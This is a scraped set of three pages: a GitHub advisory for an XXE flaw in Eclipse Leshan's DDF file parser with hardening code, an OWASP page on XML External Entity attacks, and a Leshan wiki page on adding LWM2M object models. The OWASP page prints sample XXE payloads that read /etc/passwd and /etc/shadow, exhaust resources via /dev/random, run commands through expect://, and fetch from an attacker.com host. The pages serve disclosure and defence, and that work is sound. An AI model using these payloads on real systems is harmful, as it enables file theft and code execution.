=== Content from github.com_93ea72e6_20250111_123843.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-leshan%2Fleshan%2Fsecurity%2Fadvisories%2FGHSA-wc9j-gc65-3cm7)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-leshan%2Fleshan%2Fsecurity%2Fadvisories%2FGHSA-wc9j-gc65-3cm7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=eclipse-leshan%2Fleshan)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eclipse-leshan](/eclipse-leshan)
/
**[leshan](/eclipse-leshan/leshan)**
Public

* [Notifications](/login?return_to=%2Feclipse-leshan%2Fleshan) You must be signed in to change notification settings
* [Fork
  408](/login?return_to=%2Feclipse-leshan%2Fleshan)
* [Star
   656](/login?return_to=%2Feclipse-leshan%2Fleshan)

* [Code](/eclipse-leshan/leshan)
* [Issues
  87](/eclipse-leshan/leshan/issues)
* [Pull requests
  10](/eclipse-leshan/leshan/pulls)
* [Actions](/eclipse-leshan/leshan/actions)
* [Projects
  0](/eclipse-leshan/leshan/projects)
* [Wiki](/eclipse-leshan/leshan/wiki)
* [Security](/eclipse-leshan/leshan/security)
* [Insights](/eclipse-leshan/leshan/pulse)

Additional navigation options

* [Code](/eclipse-leshan/leshan)
* [Issues](/eclipse-leshan/leshan/issues)
* [Pull requests](/eclipse-leshan/leshan/pulls)
* [Actions](/eclipse-leshan/leshan/actions)
* [Projects](/eclipse-leshan/leshan/projects)
* [Wiki](/eclipse-leshan/leshan/wiki)
* [Security](/eclipse-leshan/leshan/security)
* [Insights](/eclipse-leshan/leshan/pulse)

# DDFFileParser is vulnerable to XXE Attacks.

Moderate

[sbernard31](/sbernard31)
published
GHSA-wc9j-gc65-3cm7
Aug 31, 2023

## Package

maven

org.eclipse.leshan:leshan-core
([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

<=1.4.2
>= 2.0.0-M1, < 2.0.0-M13

## Patched versions

1.5.0
2.0.0-M13

## Description

### Impact

`DDFFileParser` and `DefaultDDFFileValidator` (and so `ObjectLoader`) are vulnerable to [XXE Attacks](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing).

[DDF file](https://github.com/eclipse-leshan/leshan/wiki/Adding-new-objects#the-lwm2m-model) is a LWM2M format used to store LWM2M object description.

Leshan users are impacted only if they parse untrusted DDF files (e.g. if they let external users provide their own model), in that case they MUST upgrade to fixed version.

If you parse only trusted DDF file and validate only with trusted xml schema, upgrading is not mandatory.

### Patches

This is fixed in **v1.5.0** and **2.0.0-M13**.

### Workarounds

No easy way. Eventually writing your own `DDFFileParser`/`DefaultDDFFileValidator` (and so `ObjectLoader`) creating a `DocumentBuilderFactory` with :

```
// For DDFFileParser
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // Disable DTDs
factory.setXIncludeAware(false); // Disable XML Inclusions
factory.setExpandEntityReferences(false); // disable expand entity reference nodes

// For DefaultDDFFileValidator
SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
```
### References

* [https://owasp.org/www-community/vulnerabilities/XML\_External\_Entity\_(XXE)\_Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing)
* <https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html>
* <https://semgrep.dev/docs/cheat-sheets/java-xxe/>
* <https://community.veracode.com/s/article/Java-Remediation-Guidance-for-XXE>

### Severity

Moderate

6.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
High

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
Low

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N

### CVE ID

CVE-2023-41034

### Weaknesses

[CWE-611](/advisories?query=cwe%3A611)

### Credits

* [![@JaroslawLegierski](https://avatars.githubusercontent.com/u/13430617?s=40&v=4)](/JaroslawLegierski)
  [JaroslawLegierski](/JaroslawLegierski)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from owasp.org_9296df93_20250111_123844.html ===


For full functionality of this site it is necessary to enable JavaScript. Here are the  [instructions how to enable JavaScript in your web browser](http://turnonjs.com/).

[![OWASP logo](https://owasp.org/assets/images/logo.png)](https://owasp.org/)

[![](https://owasp.org/assets/images/logo.png)](https://owasp.org/)

 [Store](https://owasp.org/store)
[Donate](https://owasp.org/donate?reponame=www-community)
[Join](https://owasp.org/membership)

This website uses cookies to analyze our traffic and only share that information with our analytics partners.

Accept

x

[Store](https://owasp.org/store)
[Donate](https://owasp.org/donate?reponame=www-community)
[Join](https://owasp.org/membership)

# XML External Entity (XXE) Processing

Thank you for visiting OWASP.org. We have migrated our community to a new web platform and regretably the content for this page needed to be programmatically ported from its previous wiki page. There’s still some work to be done.

This is an example of a Project or Chapter Page.

## NVD Categorization

> [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html): The software processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.

## Description

An *XML External Entity* attack is a type of attack against an
application that parses XML input. This attack occurs when **XML input
containing a reference to an external entity is processed by a weakly
configured XML parser**. This attack may lead to the disclosure of
confidential data, denial of service, server side request forgery, port
scanning from the perspective of the machine where the parser is
located, and other system impacts.

The [XML 1.0 standard](http://www.w3.org/TR/REC-xml/) defines the
structure of an XML document. The standard defines a concept called an
entity, which is a storage unit of some type. There are a few different
types of entities, [external general/parameter parsed
entity](http://www.w3.org/TR/REC-xml/#sec-external-ent) often shortened
to **external entity**, that can access local or remote content via a
declared system identifier. The system identifier is assumed to be a URI
that can be dereferenced (accessed) by the XML processor when processing
the entity. The XML processor then replaces occurrences of the named
external entity with the contents dereferenced by the system identifier.
If the system identifier contains tainted data and the XML processor
dereferences this tainted data, the XML processor may disclose
confidential information normally not accessible by the application.
Similar attack vectors apply the usage of external DTDs, external
stylesheets, external schemas, etc. which, when included, allow similar
external resource inclusion style attacks.

Attacks can include disclosing local files, which may contain sensitive
data such as passwords or private user data, using file: schemes or
relative paths in the system identifier. Since the attack occurs
relative to the application processing the XML document, an attacker may
use this trusted application to pivot to other internal systems,
possibly disclosing other internal content via http(s) requests or
launching a [CSRF](CSRF "wikilink") attack to any unprotected internal
services. In some situations, an XML processor library that is
vulnerable to client-side memory corruption issues may be exploited by
dereferencing a malicious URI, possibly allowing arbitrary code
execution under the application account. Other attacks can access local
resources that may not stop returning data, possibly impacting
application availability if too many threads or processes are not
released.

Note that the application does not need to explicitly return the
response to the attacker for it to be vulnerable to information
disclosures. An attacker can leverage DNS information to exfiltrate data
through subdomain names to a DNS server that they controls.

## Risk Factors

* The application parses XML documents.
* Tainted data is allowed within the system identifier portion of the
  entity, within the [document type declaration](http://www.w3.org/TR/REC-xml/#sec-prolog-dtd) (DTD).
* The XML processor is configured to validate and process the DTD.
* The XML processor is configured to resolve external entities within
  the DTD.

## Examples

The examples below are from [Testing for XML Injection (OWASP-DV-008)](Testing_for_XML_Injection_%5C%28OWASP-DV-008%5C%29 "wikilink").

### Accessing a local resource that may not return

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///dev/random" >]>
<foo>&xxe;</foo>

```
## Remote Code Execution

If fortune is on our side, and the PHP “expect” module is loaded, we can
get RCE. Let’s modify the payload

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
  [<!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
  <user>`&xxe;`</user>
  <pass>`mypass`</pass>
</creds>

```
### Disclosing /etc/passwd or other targeted files

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>

```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
<foo>&xxe;</foo>

```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<foo>&xxe;</foo>

```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]>
<foo>&xxe;</foo>

```
## Related [Attacks](https://owasp.org/www-community/attacks/)

* [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
* [Blind SQL Injection](Blind_SQL_Injection "wikilink")

## Related [Vulnerabilities](https://owasp.org/www-community/vulnerabilities/)

* [Missing XML Validation](Missing_XML_Validation "wikilink")

## Related [Controls](https://owasp.org/www-community/controls/)

Since the whole XML document is communicated from an untrusted client,
it’s not usually possible to selectively
[validate](Input_Validation "wikilink") or escape tainted data within
the system identifier in the DTD. Therefore, the XML processor should be
configured to use a local static DTD and disallow any declared DTD
included in the XML document.

Detailed guidance on how to disable XXE processing, or otherwise defend
against XXE attacks is presented in the [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).

## References

* OWASP [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [Timothy Morgan’s 2014 Paper: XML Schema, DTD, and Entity Attacks - A Compendium of Known Techniques](http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf)
* [Precursor presentation of above paper - at OWASP AppSec USA 2013](http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf)
* [CWE-611: Information Exposure Through XML External Entity Reference](http://cwe.mitre.org/data/definitions/611.html)
* [CWE-827: Improper Control of Document Type Definition](http://cwe.mitre.org/data/definitions/827.html)
* [Sascha Herzog’s Presentation on XML External Entity Attacks - at OWASP AppSec Germany 2010](https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf)
* [PostgreSQL XXE vulnerability](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3489)
* [SharePoint and DotNetNuke XXE Vulnerabilities, in French](http://www.agarri.fr/kom/archives/2011/09/15/failles_de_type_xee_dans_sharepoint_et_dotnetnuke/index.html)
* [XML Denial of Service Attacks and Defenses (in .NET)](http://msdn.microsoft.com/en-us/magazine/ee335713.aspx)
* [Early (2002) BugTraq Article on XXE](http://www.securityfocus.com/archive/1/297714/2002-10-27/2002-11-02/0)

Category:API\_Abuse

---

[Watch](https://github.com/owasp/www-community/subscription)
[Star](https://github.com/owasp/www-community)

**The OWASP® Foundation** works to improve the security of software through its community-led open source software projects,
hundreds of chapters worldwide, tens of thousands of members, and by hosting local and global conferences.
### Important Community Links

* [Community](/www-community/)
* [Attacks](/www-community/attacks)
* Vulnerabilities (You are here)
* [Controls](/www-community/controls)

### Upcoming OWASP Global Events

## Corporate Supporters

[Become a corporate supporter](https://owasp.org/supporters)

* [HOME](https://owasp.org/)
* [PROJECTS](https://owasp.org/projects/)
* [CHAPTERS](https://owasp.org/chapters/)
* [EVENTS](https://owasp.org/events/)
* [ABOUT](https://owasp.org/about/)
* [PRIVACY](https://owasp.org/www-policy/operational/privacy)
* [SITEMAP](https://owasp.org/sitemap/)
* [CONTACT](https://owasp.org/contact/)

OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc.



=== Content from github.com_e81c0453_20250111_123844.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-leshan%2Fleshan%2Fwiki%2FAdding-new-objects)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-leshan%2Fleshan%2Fwiki%2FAdding-new-objects)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fwiki%2Fshow&source=header-repo&source_repo=eclipse-leshan%2Fleshan)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[eclipse-leshan](/eclipse-leshan)
/
**[leshan](/eclipse-leshan/leshan)**
Public

* [Notifications](/login?return_to=%2Feclipse-leshan%2Fleshan) You must be signed in to change notification settings
* [Fork
  408](/login?return_to=%2Feclipse-leshan%2Fleshan)
* [Star
   656](/login?return_to=%2Feclipse-leshan%2Fleshan)

* [Code](/eclipse-leshan/leshan)
* [Issues
  87](/eclipse-leshan/leshan/issues)
* [Pull requests
  10](/eclipse-leshan/leshan/pulls)
* [Actions](/eclipse-leshan/leshan/actions)
* [Projects
  0](/eclipse-leshan/leshan/projects)
* [Wiki](/eclipse-leshan/leshan/wiki)
* [Security](/eclipse-leshan/leshan/security)
* [Insights](/eclipse-leshan/leshan/pulse)

Additional navigation options

* [Code](/eclipse-leshan/leshan)
* [Issues](/eclipse-leshan/leshan/issues)
* [Pull requests](/eclipse-leshan/leshan/pulls)
* [Actions](/eclipse-leshan/leshan/actions)
* [Projects](/eclipse-leshan/leshan/projects)
* [Wiki](/eclipse-leshan/leshan/wiki)
* [Security](/eclipse-leshan/leshan/security)
* [Insights](/eclipse-leshan/leshan/pulse)

# Adding new objects

[Jump to bottom](#wiki-pages-box)
 [Edit](/eclipse-leshan/leshan/wiki/Adding-new-objects/_edit)
 [New page](/eclipse-leshan/leshan/wiki/_new)

Simon edited this page Jan 4, 2021
·
[6 revisions](/eclipse-leshan/leshan/wiki/Adding-new-objects/_history)

# The LWM2M model

In LWMM2M, data available on a device is structured as a tree.

The tree is composed of LWM2M nodes (Object/Object Instance/Resource) identified by an identifier (16 bits unsigned-integer).

```
Device
├── object 0
│   ├── object instance 0
│   │  ├── resource 0
│   │  └── resource 1
│   ├── object instance 1
│   │  ├── resource 0
│   │  └── ...
│   └── ...
└── object 1
    └── ...

```

Each Object is described by a model. This model should be described in a ddf format defined by OMA (.xml).

The LWM2M secification define a set of objects in the [core specification v1.0](http://openmobilealliance.org/release/LightweightM2M/V1_0_2-20180209-A/OMA-TS-LightweightM2M-V1_0_2-20180209-A.pdf) (Appendix E.).

0. **Security Object**
1. **Server Object**
2. **Access Control Object**
3. **Device Object**
4. **Connectivity Monitoring Object**
5. **Firmware Update Object**
6. **Location Object**
7. **Connectivity Statistics Object**

All the objects defined by the OMA or registered/reserved are available [here](http://www.openmobilealliance.org/wp/OMNA/LwM2M/LwM2MRegistry.html).

Be careful, some range of Id is reserved and other are "free" to use. see [ObjectID Classes](http://www.openmobilealliance.org/wp/OMNA/LwM2M/LwM2MRegistry.html).

If all of this is not clear, we strongly recommend to read the LWM2M specification again.

# Leshan needs LW2M2M object model

Leshan needs model of objects to work, mainly for encoding/decoding data but not only.

By default :

* Leshan client and server library embed objects model from the core specification (Security, Server, Devices ...), but you could add more.
* Leshan client and server demo embed a lot of models available in the official [LWM2M registry](https://github.com/OpenMobileAlliance/lwm2m-registry/).

# How to add object support to Leshan ?

## Leshan Server Demo

Just download models (xml file) of the objects you want to support [here](http://www.openmobilealliance.org/wp/OMNA/LwM2M/LwM2MRegistry.html), or create your own models (range 32769-42768).

Put them all in an empty directory, then use the `-m` object of `leshan-server-demo`.

```
-m,--modelsfolder <arg>        A folder which contains object models in OMA DDF(.xml) format.

```

## Leshan Server

Download or create models you need as described above.

Then use the `ObjectLoader` to load it, it helps to load models from files/folders or resources in your jar/war

```
// load the core models (Security, Server, Device ...)
List<ObjectModel> models = ObjectLoader.loadDefault();
// load 3 models embedded in a "models" folder of your jar.
String[] modelPaths = new String[] { "31024.xml","10241.xml", "10242.xml"};
models.addAll(ObjectLoader.loadDdfResources("/models/", modelPaths));

// then add it to builder
LeshanServerBuilder builder = new LeshanServerBuilder();
LwM2mModelProvider modelProvider = new StaticModelProvider(models);
builder.setObjectModelProvider(modelProvider);

// then create your server
LeshanServer lwServer = builder.build();
lwServer.start();
```

## Leshan Client

As explained above, you need to get the xml files and load it with `ObjectLoaders`, but this is not as straight forward as for Leshan Server, you need to implement the object behavior too.

To implements this behavior you should implements the `LwM2mObjectEnabler` interface. We provide a `BaseObjectEnabler` abstract class which could be used as base for implementing a new LWM2M object. All of this is very flexible and allow to implement dynamic behavior.

We also provide the `ObjectEnabler` which is more rigid but also an easier way to define the object behavior.
`ObjectEnabler` is a `LwM2mObjectEnabler` implementation which delegate the "real" logic to `LwM2mInstanceEnabler` interface and so you just need to implement this `LwM2mInstanceEnabler` interface.
You don't need to create `ObjectEnabler` as `ObjectsInitializer` will do that for you.

```
// Load model
List<ObjectModel> models = ObjectLoader.loadDefault();
String[] modelPaths = new String[] {"10242.xml"};
models.addAll(ObjectLoader.loadDdfResources("/models", modelPaths));

// Create initializer with your models
ObjectsInitializer initializer = new ObjectsInitializer(new StaticModel(models));
// Create `LwM2mInstanceEnabler` instances.
initializer.setInstancesForObject(LwM2mId.SECURITY, Security.noSec("leshan.eclipseprojects.io", 123));
initializer.setInstancesForObject(LwM2mId.SERVER, new Server(123, 30, BindingMode.U, false));
initializer.setInstancesForObject(LwM2mId.DEVICE, new Device("Manufacturer", "modelNumber", "serialNumber", BindingMode.U.name()));
initializer.setInstancesForObject(10242, new Your10242InstanceEnabler());
// Use it to create LWM2MObjectEnabler
List<LwM2mObjectEnabler> enablers = initializer.createAll();

// Create and start the client
LeshanClientBuilder builder = new LeshanClientBuilder("myendpoint");
builder.setObjects(enablers);
LeshanClient client = builder.build();
client.start();
```

Look at [Leshan client Getting-Started](https://github.com/eclipse/leshan/wiki/Getting-Started-%3A-Client#create-my-own-objects) to see how to implement a `LwM2mInstanceEnabler`.

In all those examples we are using `initializer.setInstancesForObject`, which will set all the instances available at client start-up. But you should ask yourself how we handle to add a new object instance ? To create new instance, `ObjectEnabler` need a `LwM2mInstanceEnablerFactory`. By default `ObjectsInitializer` will create it for you, it will use the no-arguments constructor of the `LwM2mInstanceEnabler`. If you need a more complex factory, you can use `initializer.setFactoryForObject(objectId, factory)`. If you want to define a class for an object but not having any instance of this class at startup, just use : `initializer.setClassForObject(objectId, clazz)`

## Leshan Client Demo

By default, `leshan-client-demo` support a lot of models and you can enable an object just by calling the `create` command :

```
  - create <objectId> : to enable a new object.
  - delete <objectId> : to disable a new object.

```

When you call this command, you should see in the logs :

```
...  INFO LeshanClientDemo - Object XXXX enabled.

```

or if the model in not supported by default :

```
... INFO LeshanClientDemo - Unable to enable Object XXXX : there no model for this.

```

In this case, just download models (xml file) of the objects you want to support [here](http://www.openmobilealliance.org/wp/OMNA/LwM2M/LwM2MRegistry.html) or create your own one (range 32769-42768), then add it using the `-m` command line option.

```
-m <arg>       A folder which contains object models in OMA DDF(.xml)format.

```

By default `leshan-client-demo` will create only create ["dummy" instance](https://github.com/eclipse/leshan/blob/leshan-1.0.0-RC2/leshan-client-core/src/main/java/org/eclipse/leshan/client/resource/DummyInstanceEnabler.java). This is enough to test a server but if you need to implement a real behavior you must modify the `leshan-client-demo` code.

All contributions you make to our web site (including this wiki) are governed by our [Terms of Use](http://www.eclipse.org/legal/termsofuse.php), so please take the time to actually read it. Your interactions with the Eclipse Foundation web properties and any information you may provide us about yourself are governed by our [Privacy Policy](http://www.eclipse.org/legal/privacy.php).

### Toggle table of contents Pages 28

* Loading

  [Home](/eclipse-leshan/leshan/wiki)
* Loading

  [Adding new objects](/eclipse-leshan/leshan/wiki/Adding-new-objects)

  + [The LWM2M model](/eclipse-leshan/leshan/wiki/Adding-new-objects#the-lwm2m-model)
  + [Leshan needs LW2M2M object model](/eclipse-leshan/leshan/wiki/Adding-new-objects#leshan-needs-lw2m2m-object-model)
  + [How to add object support to Leshan ?](/eclipse-leshan/leshan/wiki/Adding-new-objects#how-to-add-object-support-to-leshan-)
  + [Leshan Server Demo](/eclipse-leshan/leshan/wiki/Adding-new-objects#leshan-server-demo)
  + [Leshan Server](/eclipse-leshan/leshan/wiki/Adding-new-objects#leshan-server)
  + [Leshan Client](/eclipse-leshan/leshan/wiki/Adding-new-objects#leshan-client)
  + [Leshan Client Demo](/eclipse-leshan/leshan/wiki/Adding-new-objects#leshan-client-demo)
* Loading

  [Cluster](/eclipse-leshan/leshan/wiki/Cluster)
* Loading

  [CoAP over TCP](/eclipse-leshan/leshan/wiki/CoAP-over-TCP)
* Loading

  [Code & design guidelines](/eclipse-leshan/leshan/wiki/Code-%26-design-guidelines)
* Loading

  [Credential files format](/eclipse-leshan/leshan/wiki/Credential-files-format)
* Loading

  [Dynamic awake time for Queue mode](/eclipse-leshan/leshan/wiki/Dynamic-awake-time-for-Queue-mode)
* Loading

  [External Challenge for Leshan project](/eclipse-leshan/leshan/wiki/External-Challenge-for-Leshan-project)
* Loading

  [F.A.Q.](/eclipse-leshan/leshan/wiki/F.A.Q.)
* Loading

  [Getting started](/eclipse-leshan/leshan/wiki/Getting-started)
* Loading

  [Getting Started : Bootstrap Server](/eclipse-leshan/leshan/wiki/Getting-Started-%3A-Bootstrap-Server)
* Loading

  [Getting Started : Client](/eclipse-leshan/leshan/wiki/Getting-Started-%3A-Client)
* Loading

  [Getting Started : Server](/eclipse-leshan/leshan/wiki/Getting-Started-%3A-Server)
* Loading

  [How Leshan should behave with Non Compliant Implementations ?](/eclipse-leshan/leshan/wiki/How-Leshan-should-behave-with-Non-Compliant-Implementations-%3F)
* Loading

  [How to contribute](/eclipse-leshan/leshan/wiki/How-to-contribute)
* Loading

  [Leshan Cluster Module](/eclipse-leshan/leshan/wiki/Leshan-Cluster-Module)
* Loading

  [Lightweight M2M Specification](/eclipse-leshan/leshan/wiki/Lightweight-M2M-Specification)
* Loading

  [LWM2M 1.1 supported features](/eclipse-leshan/leshan/wiki/LWM2M-1.1-supported-features)
* Loading

